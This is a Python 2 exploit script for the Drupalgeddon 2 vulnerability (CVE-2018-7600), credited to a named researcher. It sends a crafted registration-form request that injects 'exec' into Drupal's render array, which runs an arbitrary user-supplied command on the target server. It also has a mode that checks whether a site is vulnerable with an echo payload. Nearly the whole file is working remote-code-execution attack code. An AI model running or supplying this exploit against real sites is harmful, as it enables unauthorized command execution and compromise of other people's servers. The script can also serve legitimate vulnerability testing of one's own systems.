import requests
import argparse
import sys
import time

#Drupal Drupalgeddon 2
#(SA-CORE-2018-002 / CVE-2018-7600)
#Exploit by Dan Sharvit - (Shlacky) - Cynoia.com, @cynoia, https://www.linkedin.com/in/dansharv/
#https://github.com/sl4cky/CVE-2018-7600

G = '\033[92m'  # green
Y = '\033[93m'  # yellow
B = '\033[94m'  # blue
R = '\033[91m'  # red
W = '\033[0m'   # white


def banner():
	print "[###] SA-CORE-2018-002 / CVE-2018-7600 exploit by Dan Sharvit (cynoia)"


def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -f /root/Desktop/subdomains.txt")
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-t', '--target', help="http://target.com", required=True)
    parser.add_argument('-te', '--test', help="Test if the target is vulnerable", required=False, action="store_true")
    parser.add_argument('-c', '--command', help="ping server", required=False)
    return parser.parse_args()


def exploit(target,command):
	target_url = "{}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax".format(target)
	print "[*] Sending request to: {}".format(target)
	try:
		r = requests.post(target_url, headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "{}".format(command)})
		if r.status_code == 200:
			print "[*] - Exploit successfully sent to target"
		else:
			print "[*] - Target not vulnerable"
	except:
		print "[!] - Something went wrong"


def test_target(target):
	target_url = "{}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax".format(target)
	print "[*] Testing if: {} is vulnerable".format(target)
	try:
		r = requests.post(target_url, headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo 'haha'"})
		if r.status_code == 200:
			response = r.content
			if "haha" in response:
				print "{}[!] The target is vulnerable to SA-CORE-2018-002 / CVE-2018-7600{}".format(R,W)
		else:
			print "{}[*] - Target not vulnerable{}".format(G,W)
	except:
		print "[!] - Something went wrong"

def main():
	if command and test:
		print "[*] Please choose either testing mode or exploitation mode"
		sys.exit(1)
	if command:
		exploit(target,command)
	if test:
		test_target(target)


if __name__ == '__main__':
	banner()
	args = parse_args()
	target = args.target
	command = args.command
	test = args.test
	main()